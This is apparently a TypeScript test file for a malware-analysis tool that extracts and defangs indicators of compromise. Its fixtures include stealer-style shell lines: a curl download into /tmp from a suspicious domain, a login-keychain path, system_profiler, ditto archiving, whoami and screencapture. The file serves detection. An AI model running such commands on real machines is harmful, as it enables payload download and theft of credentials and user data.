import { describe, it, expect } from 'vitest';
import { extractIocs, defang } from '../src/iocs';

describe('extractIocs', () => {
  const cmd = `curl -sL -A 'Mozilla/5.0 (Macintosh)' 'https://cdnportal-us.xyz/x.csv' -o /tmp/dl.zip`;

  it('finds the url', () => {
    const iocs = extractIocs(cmd, 1, 'shell');
    expect(iocs.find(i => i.type === 'url')?.value).toBe('https://cdnportal-us.xyz/x.csv');
  });

  it('finds the tmp path', () => {
    const iocs = extractIocs(cmd, 1, 'shell');
    expect(iocs.some(i => i.type === 'path' && i.value === '/tmp/dl.zip')).toBe(true);
  });

  it('finds the user-agent', () => {
    const iocs = extractIocs(cmd, 1, 'shell');
    expect(iocs.some(i => i.type === 'user-agent' && i.value.includes('Mozilla/5.0'))).toBe(true);
  });

  it('dedupes repeated values', () => {
    const iocs = extractIocs(`${cmd} ${cmd}`, 1, 'shell');
    expect(iocs.filter(i => i.type === 'url').length).toBe(1);
  });

  it('reports base64 that decodes to printable text', () => {
    const b64 = Buffer.from('a clearly printable sentence used for testing iocs').toString('base64');
    const iocs = extractIocs(b64, 0, 'output');
    expect(iocs.some(i => i.type === 'base64' && i.value === b64)).toBe(true);
  });

  it('attaches the decoded plaintext to a base64 IOC', () => {
    // Plaintext must be long enough that its base64 clears the >=40-char gate.
    const plain = 'open https://example.com/benign/demo-page';
    const b64 = Buffer.from(plain).toString('base64');
    const ioc = extractIocs(b64, 0, 'output').find(i => i.type === 'base64' && i.value === b64);
    expect(ioc?.decoded).toBe(plain);
  });

  it('drops base64-shaped blobs that decode to non-printable bytes (hex/binary noise)', () => {
    const noise = Buffer.from(Array.from({ length: 48 }, (_, i) => i % 32)).toString('base64');
    const iocs = extractIocs(noise, 0, 'output');
    expect(iocs.some(i => i.type === 'base64')).toBe(false);
  });

  it('does not match JS method calls like x.open( as a command IOC', () => {
    const iocs = extractIocs('var x=new XMLHttpRequest();x.open("GET","https://example.com/c2")', 0, 'source');
    expect(iocs.some(i => i.type === 'command')).toBe(false);
  });

  it('still matches a real shell command (open with an argument)', () => {
    const iocs = extractIocs('cd /tmp && open dl.zip', 0, 'output');
    expect(iocs.some(i => i.type === 'command' && i.value.startsWith('open '))).toBe(true);
  });

  it('extracts macOS artifact paths under /Library', () => {
    const iocs = extractIocs('"/Library/Keychains/login.keychain-db"', 0, 'source');
    expect(iocs.some(i => i.type === 'path' && i.value === '/Library/Keychains/login.keychain-db')).toBe(true);
  });

  it('flags stealer-relevant shell commands (ditto, system_profiler)', () => {
    const text = 'do shell script "system_profiler SPHardwareDataType"\nditto -c -k --sequesterRsrc /tmp/x /tmp/out.zip';
    const iocs = extractIocs(text, 0, 'output');
    expect(iocs.some(i => i.type === 'command' && i.value.startsWith('system_profiler'))).toBe(true);
    expect(iocs.some(i => i.type === 'command' && i.value.startsWith('ditto'))).toBe(true);
  });

  it('matches new recon/exfil keywords (whoami, screencapture)', () => {
    const text = 'whoami -m\nscreencapture -x /tmp/s.png';
    const iocs = extractIocs(text, 0, 'shell');
    expect(iocs.some(i => i.type === 'command' && i.value.startsWith('whoami '))).toBe(true);
    expect(iocs.some(i => i.type === 'command' && i.value.startsWith('screencapture '))).toBe(true);
  });

  it('does not match JS method call obj.kill( as a command IOC (lookahead protection)', () => {
    const iocs = extractIocs('var obj = {kill(x) { }}; obj.kill(arg)', 0, 'source');
    expect(iocs.some(i => i.type === 'command' && i.value.includes('kill'))).toBe(false);
  });
});

describe('defang', () => {
  it('defangs scheme and dots', () => {
    expect(defang('https://evil.com/a')).toBe('hxxps://evil[.]com/a');
  });
});
